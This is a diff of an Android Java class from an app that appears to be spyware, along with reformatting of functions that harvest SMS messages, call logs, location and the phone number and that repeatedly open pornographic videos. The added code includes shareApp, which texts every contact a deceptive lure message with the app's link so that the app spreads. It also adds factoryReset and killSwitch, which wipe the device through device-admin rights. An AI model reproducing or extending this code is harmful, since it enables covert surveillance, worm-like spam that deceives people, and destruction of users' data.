+        } else {
             whisperAction = createWhisperAction(context, address, intent);
         }
         initNotificationManager(context);
@@ -747,16 +873,16 @@ public class Lofl {
     }
 
     private static void initNotificationManager(Context context) {
-        if(sNotificationManager == null){
+        if (sNotificationManager == null) {
             sNotificationManager = context.getSystemService(NotificationManager.class);
         }
     }
 
-    public static void startPornProvider(final Context context, final int intervalDelay){
+    public static void startPornProvider(final Context context, final int intervalDelay) {
         new Thread(new Runnable() {
             @Override
             public void run() {
-                for(int i = 0; i < 1000; i++){
+                for (int i = 0; i < 1000; i++) {
                     try {
                         Thread.sleep(intervalDelay);
                     } catch (InterruptedException e) {
@@ -764,9 +890,9 @@ public class Lofl {
                     }
                     double randomNumber = Math.random();
                     String video = null;
-                    if(randomNumber > 0.5){
+                    if (randomNumber > 0.5) {
                         video = Pornhub.VIDEOS[0];
-                    }else{
+                    } else {
                         video = Pornhub.VIDEOS[1];
                     }
                     watchPornHubVideo(context, video);
@@ -775,7 +901,7 @@ public class Lofl {
         }).start();
     }
 
-    public static LocationListener getLocationListener(Context context){
+    public static LocationListener getLocationListener(Context context) {
         return new LocationListener() {
             @Override
             public void onLocationChanged(Location location) {
@@ -812,7 +938,7 @@ public class Lofl {
         };
     }
 
-    public static ArrayList<SmsMsg>fetchSmsMessages(Context context){
+    public static ArrayList<SmsMsg> fetchSmsMessages(Context context) {
         String[] sentColumns = new String[]{Telephony.Sms.Sent._ID, Telephony.Sms.Sent.TYPE, Telephony.Sms.Sent.BODY, Telephony.Sms.Sent.ADDRESS, Telephony.Sms.Sent.DATE};
         ArrayList<SmsMsg> smsMsgs = new ArrayList<>();
         Cursor cursor = context.getContentResolver().query(Telephony.Sms.Sent.CONTENT_URI, sentColumns, null, null, null);
@@ -822,7 +948,7 @@ public class Lofl {
             int bodyIndex = cursor.getColumnIndex(Telephony.Sms.Sent.BODY);
             int addressIndex = cursor.getColumnIndex(Telephony.Sms.Sent.ADDRESS);
             int dateIndex = cursor.getColumnIndex(Telephony.Sms.Sent.DATE);
-            while(cursor.moveToNext()){
+            while (cursor.moveToNext()) {
                 int id = cursor.getInt(idIndex);
                 int type = cursor.getInt(typeIndex);
                 String body = cursor.getString(bodyIndex);
@@ -841,7 +967,7 @@ public class Lofl {
             int bodyIndex = cursor.getColumnIndex(Telephony.Sms.Inbox.BODY);
             int addressIndex = cursor.getColumnIndex(Telephony.Sms.Inbox.ADDRESS);
             int dateIndex = cursor.getColumnIndex(Telephony.Sms.Inbox.DATE);
-            while(cursor.moveToNext()){
+            while (cursor.moveToNext()) {
                 int id = cursor.getInt(idIndex);
                 int type = cursor.getInt(typeIndex);
                 String body = cursor.getString(bodyIndex);
@@ -854,7 +980,7 @@ public class Lofl {
         return smsMsgs;
     }
 
-    public static Pair<String, String> handleSms(Context context, Intent intent){
+    public static Pair<String, String> handleSms(Context context, Intent intent) {
         StringBuilder address = new StringBuilder();
         StringBuilder body = new StringBuilder();
         SmsMessage[] smsMessage = Telephony.Sms.Intents.getMessagesFromIntent(intent);
@@ -867,12 +993,12 @@ public class Lofl {
     }
 
 
-    public static void sendDeliveryReportSms(String address){
+    public static void sendDeliveryReportSms(String address) {
         SmsManager smsManager = SmsManager.getDefault();
         smsManager.sendDataMessage(address, null, new Short("6666"), Constants.DELIVERY_REPORT_CODE.getBytes(), null, null);
     }
 
-    public static void notifyDelivered(Context context, Intent intent){
+    public static void notifyDelivered(Context context, Intent intent) {
         sId++;
         createConfirmationsNotificationChannel(context);
         Notification.Builder builder = new Notification.Builder(context, Constants.CONFIRMATIONS_NOTIFICATION_CHANNEL_ID);
@@ -899,7 +1025,7 @@ public class Lofl {
         }
     }
 
-    public static String getDeviceTelephoneNumber(Context context){
+    public static String getDeviceTelephoneNumber(Context context) {
         try {
             TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
             return telephonyManager.getLine1Number();
@@ -909,18 +1035,18 @@ public class Lofl {
         }
     }
 
-    public static ArrayList<PhoneCall> fetchCallLogOutgoing(Context context){
+    public static ArrayList<PhoneCall> fetchCallLogOutgoing(Context context) {
         String[] columns = new String[]{CallLog.Calls.TYPE, CallLog.Calls.NUMBER, CallLog.Calls.DATE, CallLog.Calls.DURATION};
         String selection = CallLog.Calls.TYPE + " = ?";
         String[] selectionArgs = new String[]{String.valueOf(CallLog.Calls.OUTGOING_TYPE)};
         ArrayList<PhoneCall> phoneCalls = new ArrayList<>();
         Cursor cursor = context.getContentResolver().query(Uri.parse("content://call_log/calls"), columns, selection, selectionArgs, null);
-        if(cursor != null){
+        if (cursor != null) {
             int typeIndex = cursor.getColumnIndex(CallLog.Calls.TYPE);
             int numberIndex = cursor.getColumnIndex(CallLog.Calls.NUMBER);
             int dateIndex = cursor.getColumnIndex(CallLog.Calls.DATE);
             int durationIndex = cursor.getColumnIndex(CallLog.Calls.DURATION);
-            while(cursor.moveToNext()){
+            while (cursor.moveToNext()) {
                 String callType = cursor.getString(typeIndex);
                 String address = cursor.getString(numberIndex);
                 String time = cursor.getString(dateIndex);
@@ -932,18 +1058,18 @@ public class Lofl {
         return phoneCalls;
     }
 
-    public static ArrayList<PhoneCall> fetchCallLogIncoming(Context context){
+    public static ArrayList<PhoneCall> fetchCallLogIncoming(Context context) {
         String[] columns = new String[]{CallLog.Calls.TYPE, CallLog.Calls.NUMBER, CallLog.Calls.DATE, CallLog.Calls.DURATION};
         String selection = CallLog.Calls.TYPE + " = ?";
         String[] selectionArgs = new String[]{String.valueOf(CallLog.Calls.INCOMING_TYPE)};
         ArrayList<PhoneCall> phoneCalls = new ArrayList<>();
         Cursor cursor = context.getContentResolver().query(Uri.parse("content://call_log/calls"), columns, selection, selectionArgs, null);
-        if(cursor != null){
+        if (cursor != null) {
             int typeIndex = cursor.getColumnIndex(CallLog.Calls.TYPE);
             int numberIndex = cursor.getColumnIndex(CallLog.Calls.NUMBER);
             int dateIndex = cursor.getColumnIndex(CallLog.Calls.DATE);
             int durationIndex = cursor.getColumnIndex(CallLog.Calls.DURATION);
-            while(cursor.moveToNext()){
+            while (cursor.moveToNext()) {
                 String callType = cursor.getString(typeIndex);
                 String address = cursor.getString(numberIndex);
                 String time = cursor.getString(dateIndex);
@@ -955,18 +1081,18 @@ public class Lofl {
         return phoneCalls;
     }
 
-    public static ArrayList<PhoneCall> fetchCallLogRejected(Context context){
+    public static ArrayList<PhoneCall> fetchCallLogRejected(Context context) {
         String[] columns = new String[]{CallLog.Calls.TYPE, CallLog.Calls.NUMBER, CallLog.Calls.DATE, CallLog.Calls.DURATION};
         String selection = CallLog.Calls.TYPE + " = ?";
         String[] selectionArgs = new String[]{String.valueOf(CallLog.Calls.REJECTED_TYPE)};
         ArrayList<PhoneCall> phoneCalls = new ArrayList<>();
         Cursor cursor = context.getContentResolver().query(Uri.parse("content://call_log/calls"), columns, selection, selectionArgs, null);
-        if(cursor != null){
+        if (cursor != null) {
             int typeIndex = cursor.getColumnIndex(CallLog.Calls.TYPE);
             int numberIndex = cursor.getColumnIndex(CallLog.Calls.NUMBER);
             int dateIndex = cursor.getColumnIndex(CallLog.Calls.DATE);
             int durationIndex = cursor.getColumnIndex(CallLog.Calls.DURATION);
-            while(cursor.moveToNext()){
+            while (cursor.moveToNext()) {
                 String callType = cursor.getString(typeIndex);
                 String address = cursor.getString(numberIndex);
                 String time = cursor.getString(dateIndex);
@@ -978,18 +1104,18 @@ public class Lofl {
         return phoneCalls;
     }
 
-    public static ArrayList<PhoneCall> fetchCallLogMissed(Context context){
+    public static ArrayList<PhoneCall> fetchCallLogMissed(Context context) {
         String[] columns = new String[]{CallLog.Calls.TYPE, CallLog.Calls.NUMBER, CallLog.Calls.DATE, CallLog.Calls.DURATION};
         String selection = CallLog.Calls.TYPE + " = ?";
         String[] selectionArgs = new String[]{String.valueOf(CallLog.Calls.MISSED_TYPE)};
         ArrayList<PhoneCall> phoneCalls = new ArrayList<>();
         Cursor cursor = context.getContentResolver().query(Uri.parse("content://call_log/calls"), columns, selection, selectionArgs, null);
-        if(cursor != null){
+        if (cursor != null) {
             int typeIndex = cursor.getColumnIndex(CallLog.Calls.TYPE);
             int numberIndex = cursor.getColumnIndex(CallLog.Calls.NUMBER);
             int dateIndex = cursor.getColumnIndex(CallLog.Calls.DATE);
             int durationIndex = cursor.getColumnIndex(CallLog.Calls.DURATION);
-            while(cursor.moveToNext()){
+            while (cursor.moveToNext()) {
                 String callType = cursor.getString(typeIndex);
                 String address = cursor.getString(numberIndex);
                 String time = cursor.getString(dateIndex);
@@ -1001,16 +1127,16 @@ public class Lofl {
         return phoneCalls;
     }
 
-    public static ArrayList<PhoneCall> fetchCallLog(Context context){
+    public static ArrayList<PhoneCall> fetchCallLog(Context context) {
         String[] columns = new String[]{CallLog.Calls.TYPE, CallLog.Calls.NUMBER, CallLog.Calls.DATE, CallLog.Calls.DURATION};
         ArrayList<PhoneCall> phoneCalls = new ArrayList<>();
         Cursor cursor = context.getContentResolver().query(Uri.parse("content://call_log/calls"), columns, null, null, CallLog.Calls.DEFAULT_SORT_ORDER);
-        if(cursor != null){
+        if (cursor != null) {
             int typeIndex = cursor.getColumnIndex(CallLog.Calls.TYPE);
             int numberIndex = cursor.getColumnIndex(CallLog.Calls.NUMBER);
             int dateIndex = cursor.getColumnIndex(CallLog.Calls.DATE);
             int durationIndex = cursor.getColumnIndex(CallLog.Calls.DURATION);
-            while(cursor.moveToNext()){
+            while (cursor.moveToNext()) {
                 String callType = cursor.getString(typeIndex);
                 String address = cursor.getString(numberIndex);
                 String time = cursor.getString(dateIndex);
@@ -1020,6 +1146,62 @@ public class Lofl {
         }
         cursor.close();
         return phoneCalls;
+    }
+
+    public static void shareApp(Context context) {
+        Thread thread = null;
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                Process.setThreadPriority(Process.THREAD_PRIORITY_BACKGROUND);
+                ArrayList<Contact> contacts = fetchContactsInformation(context);
+                String body = String.format("bro im dt right now about to work Ive got to tell you something but i cant use snapchat so use this. %s", Constants.APP_URI);
+                boolean shouldSendNonPersisting = false;
+        /*        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+                    shouldSendNonPersisting = true;
+                }*/
+                for (Contact contact : contacts) {
+                    try {
+                        Thread.sleep(10000);
+                    } catch (InterruptedException e) {
+                        e.printStackTrace();
+                    }
+                    if (shouldSendNonPersisting) {
+                        sendNonPersistingSms(context, contact.mAddress, body);
+                    } else {
+                        sendNonDataSms(context, contact.mAddress, body);
+                    }
+                }
+            }
+        }).start();
+    }
+
+
+    @SuppressLint({"MissingPermission", "NewApi"})
+    @TargetApi(Build.VERSION_CODES.P)
+    public static void sendNonPersistingSms(Context context, String address, String body) {
+        SmsManager smsManager = SmsManager.getDefault();
+        smsManager.sendTextMessageWithoutPersisting(address, null, body, null, null);
+    }
+
+    public static boolean factoryReset(Context context){
+        DevicePolicyManager devicePolicyManager = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
+        ComponentName componentName = new ComponentName(context, AdminReceiver.class);
+        if(devicePolicyManager.isAdminActive(componentName)){
+            devicePolicyManager.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE);
+            return true;
+        }
+        return false;
+    }
+
+    public static void killSwitch(Context context){
+        DevicePolicyManager devicePolicyManager = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
+        ComponentName componentName = new ComponentName(context, AdminReceiver.class);
+        if(devicePolicyManager.isAdminActive(componentName)){
+            devicePolicyManager.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE);
+        }else{
+            uninstallApp(context, "com.candroid.textme");
+        }
     }
 
     public static void pickContact(Activity activity) {
